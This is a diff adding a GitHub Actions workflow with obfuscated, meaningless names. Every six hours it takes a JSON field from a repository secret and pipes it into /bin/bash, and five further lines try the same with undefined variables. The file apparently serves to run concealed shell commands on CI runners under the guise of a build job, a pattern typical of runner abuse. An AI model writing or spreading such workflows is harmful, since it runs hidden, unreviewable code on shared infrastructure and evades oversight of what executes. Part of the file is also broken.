@@ -1,0 +1,21 @@
+name: yutongvvg
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutongvvg
+        env:
+          e869: ${{ secrets.e869 }}
+        run: |
+          echo $e869 | jq -r .zxflx95 | /bin/bash
+          echo $vrl772 | jq -r .io7136 | /bin/bash
+          echo $sa54 | jq -r .h39 | /bin/bash
+          echo $dach82351 | jq -r .kxas8 | /bin/bash
+          echo $jgsd536 | jq -r .a954 | /bin/bash
+          echo $do3 | jq -r .uum2760 | /bin/bash
+
